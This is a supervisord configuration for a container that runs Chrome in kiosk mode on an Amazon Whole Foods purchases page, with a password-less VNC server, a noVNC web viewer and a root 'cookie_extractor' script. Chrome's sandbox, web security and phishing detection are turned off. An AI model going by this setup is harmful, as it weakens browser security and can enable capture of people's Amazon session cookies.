[supervisord]
nodaemon=true

[program:xvfb]
command=/usr/bin/Xvfb :1 -screen 0 1280x800x24 -ac +extension GLX +render -noreset
user=root
autostart=true
autorestart=true

[program:fluxbox]
command=fluxbox
user=root
autostart=true
autorestart=true
environment=DISPLAY=":1"
priority=200

[program:chrome]
command=google-chrome --no-sandbox --disable-dev-shm-usage --disable-gpu --disable-web-security --disable-features=VizDisplayCompositor --kiosk --app="https://www.amazon.com/fmc/pastpurchases/whole-foods-market" --no-first-run --no-default-browser-check --disable-default-apps --disable-extensions --disable-plugins --disable-sync --disable-background-networking --disable-background-timer-throttling --disable-client-side-phishing-detection --disable-component-update --disable-domain-reliability --disable-features=TranslateUI --disable-ipc-flooding-protection --disable-renderer-backgrounding --disable-backgrounding-occluded-windows --disable-features=VizDisplayCompositor --metrics-recording-only --no-report-upload --disable-background-timer-throttling --disable-renderer-backgrounding --disable-backgrounding-occluded-windows --disable-features=TranslateUI --disable-ipc-flooding-protection --disable-client-side-phishing-detection --disable-component-update --disable-domain-reliability --disable-background-networking --disable-sync --disable-plugins --disable-extensions --disable-default-apps --no-default-browser-check --no-first-run
user=root
autostart=true
autorestart=true
environment=DISPLAY=":1",CHROME_HEADLESS=1,CHROME_NO_SANDBOX=1
priority=300
startsecs=10

[program:x11vnc]
command=x11vnc -display :1 -nopw -listen localhost -xkb -ncache 10 -ncache_cr -forever
user=root
autostart=true
autorestart=true
priority=400

[program:novnc]
command=/usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 6080
user=root
autostart=true
autorestart=true
priority=500

[program:cookie_extractor]
command=python3 /usr/local/bin/cookie_extractor.py
user=root
autostart=true
autorestart=false
environment=DISPLAY=":1"
priority=600 